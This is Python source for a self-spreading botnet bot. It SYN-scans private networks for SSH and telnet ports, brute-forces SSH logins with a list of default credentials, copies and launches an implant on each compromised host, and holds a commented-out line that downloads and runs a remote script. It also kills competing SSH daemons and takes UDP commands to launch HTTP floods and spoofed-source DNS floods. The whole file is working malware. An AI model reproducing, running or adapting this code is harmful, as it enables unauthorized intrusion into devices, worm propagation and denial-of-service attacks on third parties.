import json
import time
import asyncio
import os
from threading import Thread, Lock
import ipaddress
import queue
import paramiko
import http.client
import string
import signal
import sys

from random import randint, choice, shuffle
from scapy.all import IP, TCP, sr1, RandShort, DNS, DNSQR, UDP

MY_IP = "0.0.0.0"
UDP_PORT = "9191"
OUR_DNS = "192.168.1.1"
LOCK_FILE = '/tmp/b'
ATK_FILE = "attack.py"
IMPL_FILE = "implant.zip"

SCAN_NETWORK = ['192.168.1.0/24', '192.168.2.0/24', '192.168.3.0/24', '192.168.4.0/24', '192.168.5.0/24', '192.168.6.0/24', '192.168.7.0/24']
SCAN_PORT = [22, 23]
SCAN_RATE = 1
OPEN_IPS = {}
LOCK = Lock()

MODULE = 'bot_'+str(randint(1000, 99999))

CRED_LIST = [
    ("root","password"),
    ("root","qwerty"),
    ("admin","admin"),
    ("admin","root"),    
    ("admin","qwerty"),
    ("admin","password"),
    ("admin","12345"),
    ("root","root"),
    ("admin","00000"),
    ("pi","12345"),
    ("pi","raspberry"),  
    ("pi","qwerty1"),  
    ("pi","qwerty2"),  
    ("pi","qwerty3"),  
    ("pi","qwerty4"),  
    ("pi","qwerty5"),  
    ("pi","qwerty6"),  
    ("pi","qwerty7"),  
    ("pi","qwerty8"),  
    ("pi","qwert1"),  
    ("pi","qwert2"),  
    ("pi","qwert3"),  
    ("pi","qwert4"),  
    ("pi","qwert5"),  
    ("pi","qwert6"),  
    ("pi","qwert7"),  
    ("pi","qwert8"),  
    ("pi","qwert9"),  
    ("pi","qwert19"),  
    ("pi","qwert29"),  
    ("pi","qwert39"),  
    ("pi","qwert49"),  
    ("pi","qwert59"),  
    ("pi","qwert69"),  
    ("pi","qwert79"),  
    ("pi","qwert89"),  
    ("pi","qwert99"),  
    ("pi","qwert791"),  
    ("pi","qwert792"),  
    ("pi","qwert793"),  
    ("pi","qwert794"),  
    ("pi","qwert795"),  
    ("pi","qwert896"),  
    ("pi","qwert997"),  
    ("pi","qwert898"),  
    ("pi","qwert999"),  
    ("pi","qwert189"),  
    ("pi","qwert299"),  
    ("pi","qwert389"),  
    ("pi","qwert499"),  
    ("pi","qwert589"),  
    ("pi","qwert699"),  
]

# Get random IP address from given network.
def get_ip_address(i_network):
    net = ipaddress.IPv4Network(i_network)
    return net[randint(2, net.num_addresses-2)].exploded


def int_handler(sig, frame):
    os.remove(LOCK_FILE)
    sys.exit(0)


# Kill ssh processes. 
def kill_processes():
    #os.system('pkill ssh')
    os.system("kill -9 `ps ax | grep dropbear | grep -v grep | awk '{ print $1}'`")
    if os.path.isfile(LOCK_FILE):
        sys.exit("Already Running.")
    else:
        os.mknod(LOCK_FILE)
  

# attack class.
class attack(Thread):
    def __init__(self, i_type, i_ip, i_port):
        super(attack, self).__init__()
        self._type = i_type
        self._ip = i_ip
        self._port = i_port

    @staticmethod
    def get_random_string(i_len):
        return ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(i_len))

    def run(self):       
        if self._type == 0:
            connection = http.client.HTTPConnection(self._ip, port=self._port)
            headers = {'Content-type': 'application/json'}
            for i in range(randint(30,40)):
                connection.request("GET", self.get_random_string(7), headers=headers)
                _ = connection.getresponse()
            connection.close()
        elif self._type == 1:
            for i in range(randint(30,40)):
                l_qname = 'somedomain.com'
                dns_req = IP(src=self._ip, dst=OUR_DNS)/UDP(dport=53, sport=RandShort())/DNS(rd=1, qd=DNSQR(qname=l_qname))
                _ = sr1(dns_req, timeout=0, verbose=0)
        else:
            pass


# SSH login thread.
class ssh_login(Thread):
    def __init__(self, ip, uname, pwd):
        super(ssh_login, self).__init__()
        self._uname = uname
        self._pwd = pwd
        self._ip = ip

    def run(self):
        global OPEN_IPS
        s = paramiko.SSHClient()
        s.load_system_host_keys()
        s.set_missing_host_key_policy(paramiko.WarningPolicy)

        try:
            s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)

            # Copy malware locally and execute.
            sftp = paramiko.SFTPClient.from_transport(s)
            f_name = "/tmp/{}".format(IMPL_FILE)
            sftp.put(f_name, f_name)
            sin, sout, serr = s.exec_command("python3 {} &".format(f_name))
            
            """
            # Download malware from loader and execute.
            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry.py;python3 /tmp/bot.py {} {} &touch /tmp/done;".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
            sin, sout, serr = s.exec_command(cmd)
            """
            sout.channel.recv_exit_status()

            print('Login successful using {} {} {}.'.format(self._ip, self._uname, self._pwd))
            with LOCK:
                OPEN_IPS[self._ip]['login'] = True
                OPEN_IPS[self._ip]['uname'] = self._uname
                OPEN_IPS[self._ip]['pwd'] = self._pwd
        except paramiko.ssh_exception.NoValidConnectionsError:
            with LOCK:
                del OPEN_IPS[self._ip]
            print('Port closed for IP: {}. Deleting'.format(self._ip))
        except paramiko.ssh_exception.AuthenticationException:
            pass
        except:
            print(sys.exc_info())
            #print('Login Failed.')
        finally:
            s.close()


# TCP scan thread.
class tcp_scan(Thread):
    def __init__(self, ip, port):
        super(tcp_scan, self).__init__()
        self._port = port
        self._ip = ip

    def run(self):
        global OPEN_IPS
        p = IP(dst = self._ip)/TCP(sport=RandShort(), dport=self._port, flags='S')    
        resp = sr1(p, timeout=2, verbose=0)
        if resp is None:
            pass
            #print("[X] ip {} NOT open.".format(self._ip))
        elif resp.haslayer(TCP):
            if resp.getlayer(TCP).flags == 0x12:
                #send_rst = sr(IP(dst=ip)/TCP(sport=src_port, dport=SCAN_PORT, flags='AR'), timeout=1)
                if not self._ip in OPEN_IPS.keys() and not self._ip == MY_IP:
                    with LOCK:
                        OPEN_IPS[self._ip] = {'uname':"", 'pwd':"", 'login':False}
                    print("[<<>>] IP {} open.".format(self._ip))
            elif resp.getlayer(TCP).flags == 0x14:
                pass
                #print("[X] ip {} NOT open.".format(self._ip))


# SSH login routine.
async def login():
    global OPEN_IPS
    
    duration = 10.0
    while True:
        if SCAN_RATE == 0:
            duration = 15.0
            max_logins = 2
        elif SCAN_RATE == 1:
            max_logins = randint(5,10)
            duration = 10.0
        elif SCAN_RATE == 2:
            duration = 5.0
            max_logins = randint(15,20)
        else:
            pass

        #print('[D] Login Thread.')

        max_logins = 2
        with LOCK:
            kk = OPEN_IPS.copy()

        for ip in kk.keys():
            if kk[ip]['login'] is False:
                for _ in range(max_logins):
                    vals = choice(CRED_LIST)
                    login_attempt = ssh_login(ip, vals[0], vals[1])
                    login_attempt.start()

        await asyncio.sleep(duration)


# Scanner routine.
async def scan():
    duration = 5.0

    while True:
        max_ips = 20
        if SCAN_RATE == 0:
            max_ips = 4
            duration = 15.0
        elif SCAN_RATE == 1:
            max_ips = 6
            duration = 7.0
        elif SCAN_RATE == 2:
            max_ips = 10
            duration = 2.0
        else:
            pass

        for _ in range(randint(max_ips/2, max_ips)):
            t_scan = tcp_scan(get_ip_address(choice(SCAN_NETWORK)), int(choice(SCAN_PORT)))       
            t_scan.start()

        #print("[D] OPEN_IPS: {}".format(OPEN_IPS))
        await asyncio.sleep(duration)


class EchoServerProtocol:
    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data, addr):
        message = data.decode()
        print('Received %r from %s' % (message, addr))
        handle_msg(self.transport, message, addr)

def handle_msg(i_transport, i_data, i_addr):

    local_data = json.loads(i_data)
    local_msg = local_data['data']

    ip = local_msg['ip']
    port = int(local_msg['port'])
    code = int(local_msg['code'])
    
    t = attack(code, ip, port)
    t.start()

def get_my_ip():
    global MY_IP, MODULE
    f = os.popen("ip a | grep 'scope global' | awk '{ print $NF }'")
    local_eth = f.read().rstrip()
    f = os.popen('/sbin/ifconfig {} | grep "inet" | cut -d: -f2 | cut -d" " -f1'.format(local_eth))
    # Keep some verifier, see the returned item is ok or not.
    MY_IP = f.read().rstrip()
    MODULE = 'bot_'+MY_IP

kill_processes()

get_my_ip()

signal.signal(signal.SIGHUP, signal.SIG_IGN)
signal.signal(signal.SIGINT, int_handler)
EVENT_LOOP = asyncio.get_event_loop()
asyncio.ensure_future(scan())
asyncio.ensure_future(login())

print('[+]Starting UDP server on {}.'.format(UDP_PORT))
listen = EVENT_LOOP.create_datagram_endpoint(EchoServerProtocol, local_addr=('127.0.0.1', UDP_PORT))
transport, protocol = EVENT_LOOP.run_until_complete(listen)

print('[D] Starting module.')

try:
    EVENT_LOOP.run_forever()
except KeyboardInterrupt:
    pass
finally:
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)
    EVENT_LOOP.close()